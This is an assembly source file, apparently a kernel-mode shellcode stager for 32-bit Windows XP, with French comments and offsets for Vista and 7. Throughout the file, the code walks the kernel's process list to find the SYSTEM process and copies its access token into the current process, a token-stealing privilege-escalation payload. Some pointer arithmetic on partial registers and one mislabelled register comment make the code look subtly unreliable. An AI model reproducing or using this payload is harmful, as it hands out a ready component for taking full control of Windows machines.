;stager_ring0_xp.asm
;D:\Outils\nasm\nasm.exe -f bin stager_ring0_xp.asm -o stager.exe
;
;set current token to SYSTEM's token
BITS 32

_start:
	pushad

find_current_eprocess:
	mov bx, (0x120 + 4)              ;0x120 = KPCR.PrcbData :: 0x4 = KPRCB.CurrentThread
	mov eax, dword [fs : bx]              ;EAX = KPCR.PrcbData.CurrentThread

	; [*] Generate KTHREAD.ApcState offsets..
	; 'winxpsp123_x86' -> 0x034 | 'winvistartmsp1sp2_x86' -> 0x038 | 'win7rtm_x86' -> 0x040
	;  0x10 offset KAPC_STATE.Process - constant
	mov eax, dword [eax + 0x034 + 0x10]      ;EAX = KTHREAD.ApcState.Process
	
	; EBP = Sauvegarde de l'EPROCESS du debut du parcours
	mov ebp, eax
	
	; [*] Generate EPROCESS.ActiveProcessLinks offsets..
	; 'winxpsp123_x86' -> 0x088 | 'winvistartmsp12_x86' -> 0x0A0 | 'win7rtm_x86' -> 0x0B8
	xor ecx, ecx
	mov cl, 0x88 ;EDX = offset EPROCESS.ActiveProcessLinks :: On stocke l'offset ici, plus commode
	add ax, cx   ;EAX= CurrentEPROCESS.ActiveProcessLinks
	
walk_list_entry:
	mov edx, dword [eax] ;EDX = PLIST_ENTRY suivante
	mov eax, edx

	;Le champs d'avant ActiveProcessLinks = UniqueProcessId
	cmp dword [edx - 0x4], 0x4     ;Est-ce le PID de systeme ?
	je escaladate_privileges
	jmp walk_list_entry

escaladate_privileges:
	; EBP = notre EPROCESS
	; EDX = System EPROCESS
	sub dl, 0x88 ; On realigne pour avoir l'EPROCESS
	
	;[*] Generate EPROCESS.Token offsets..
	; 'winxpsp123_x86' -> 0x0C8 | 'winvistartmsp12_x86' -> 0x0E0 | 'win7rtm_x86' -> 0x0F8

	add dl, 0xC8
	mov esi, dword [edx] ; ESI = System token
	
	xor edx, edx
	mov dl, 0xC8
	mov dword [edx + ebp], esi

it_is_done_folks:
	
	popad
	ret	